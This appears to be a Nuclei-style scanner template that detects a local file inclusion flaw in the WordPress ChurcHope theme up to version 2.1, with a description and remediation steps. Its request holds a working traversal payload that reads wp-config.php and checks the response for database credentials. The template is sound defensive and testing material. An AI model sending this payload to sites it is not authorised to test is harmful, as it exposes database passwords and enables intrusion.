id: churchope-lfi
info:
  name: WordPress ChurcHope Theme <= 2.1 - Local File Inclusion
  author:
  - l0ne1y
  tags:
  - wordpress
  - wp-theme
  - lfi
  - wp
  description: |-
    Wordpress Theme ChurcHope Theme <= 2.1 has an arbitrary file download vulnerability
    WordPress ChurcHope Theme <= 2.1 is susceptible to local file inclusion. The vulnerability is due to improper sanitization of user-supplied input passed via the "file" HTTP GET parameter to the publicly accessible "/lib/downloadlink.php" script.
  reference:
  - https://wpscan.com/vulnerability/3c5833bd-1fe0-4eba-97aa-7d3a0c8fda15
  severity: high
  classification:
    cwe-id:
    - cwe-22
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.com/zh-cn/themes

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php'
  method: GET
